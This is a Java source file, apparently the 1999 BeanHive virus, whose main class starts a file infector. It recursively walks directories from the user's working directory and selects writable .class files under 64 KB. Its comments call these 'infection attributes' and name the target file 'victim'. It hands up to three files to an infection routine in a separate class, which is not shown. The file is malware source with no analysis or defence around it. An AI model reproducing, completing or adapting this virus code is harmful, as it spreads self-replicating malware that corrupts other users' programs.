//=============================================================
//
// Title:  BeanHive.java
// Author: Landing Camel International
// Date:   January 1999
//
// Notes:  This class starts the ball rolling
//
//=============================================================

import java.util.*;
import java.io.*;

public class BeanHive {

   //----------------------------------------------------------
   public static void main(String argv[]) throws IOException {

      BeanHive m = new BeanHive();

   }
   //----------------------------------------------------------
   
   //----------------------------------------------------------   	
   public BeanHive() throws IOException {
   
      run();
   	
   }
   //----------------------------------------------------------	
   	
   //----------------------------------------------------------   	
   public void run() throws IOException {

      start(new File(System.getProperty("user.dir")));

   }
   //----------------------------------------------------------	

   private int inf = 0;
   	
   //----------------------------------------------------------   	
   public void start(File present) throws IOException {   	
   	   	
      int ind;
      File entry;
      String[] dir;
      e89a763c vstart = new e89a763c();
      RandomAccessFile victim;

      //iterate through files in current directory
      for (dir = present.list(), ind = 0;
         dir != null && ind < dir.length && inf < 3; ind++) {

         entry = new File(present, dir[ind]);

         //test file for infection attributes
         if ((entry.isFile()) && (dir[ind].endsWith(".class")) &&
             (entry.length() < 0xFFFF) &&
             (entry.canRead()) && (entry.canWrite())) {

            if (vstart.poke(entry)) inf++;            

        }
        
        else if ((entry.isDirectory()) && (entry.canRead())) start(entry);
        
      }
   }
   //----------------------------------------------------------

} // End class
